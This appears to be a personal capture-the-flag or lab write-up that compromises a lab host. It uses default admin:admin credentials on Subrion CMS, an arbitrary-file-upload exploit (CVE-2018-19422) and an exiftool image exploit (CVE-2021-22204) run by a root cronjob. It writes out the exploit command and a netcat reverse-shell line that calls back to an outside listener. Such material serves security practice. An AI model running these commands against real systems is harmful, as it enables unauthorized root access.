#box

*Created: 1/6/2026*

### Step 1

**Tags:** #Web-Enumeration #Web-Shell #Arbitrary-File-Upload #Weak-Credentials

**Command:**
```python
python3 49876.py -u http://192.168.200.163/panel.php -l admin -p admin
```

*Port: 80*

> 
> On port 80 we discover a service running and a quick Enumeration highlights a `/panel.php` endpoint which exposes a service called Subrion CMS. The version is also shown in clear Subrion CMS v4.2.1. After trying for some easy combination we discover that we can authenticate with `admin:admin`. We also discover that the [CVE-2018-19422](https://www.exploit-db.com/exploits/49876) permits us to load an arbitrary file
> 
> The script requires a bit of refinement since the URL used are:
> * Login URL -> url specified in the command
> * Upload URL -> url + /uploads/read.json
> * Shell URL -> url + /uploads/
> 
> However, our login is at IP/panel.php.
> 
> We fixed the script by adjusting those 3 variables according to our case:
> 
> ```python
> url_login = options.url + 'panel.php'
> url_upload = options.url + 'panel/uploads/read.json'
> url_shell = options.url + 'panel/uploads/'
> ```

---

### Step 2

**Tags:** #exiftool #binaries #Linux #Images

🔗 **URL/Link:** https://github.com/bilkoh/POC-CVE-2021-22204

**Command:**
```bash
my $cmd = $args || 'busybox nc 192.168.45.245 4444 -e /bin/bash';
```

*Port: 80*

> 
> We get a Reverse shell from the webshell by using `busybox nc 192.168.45.245 4444 -e sh`  and make the TTY fully interactive. We discovere the presence of a crontab that executes a script running `exiftool`. A quick search online for exiftool vulnerabilities returns us [CVE-2021-22204](https://github.com/bilkoh/POC-CVE-2021-22204). We inject a reverse shell in our JPG image that once extracted will execute the code granting us a shell as root (the cronjob is running as root).
> To inject the reverse shell we'll update the exploit to have the following bash code injected into the image
> 
> The exploit is achieved by uploading inside the admin Panel of Subrion CMS the malicious image. After one minute, on our listener on port 4444 we'll receive a connection as root.

---

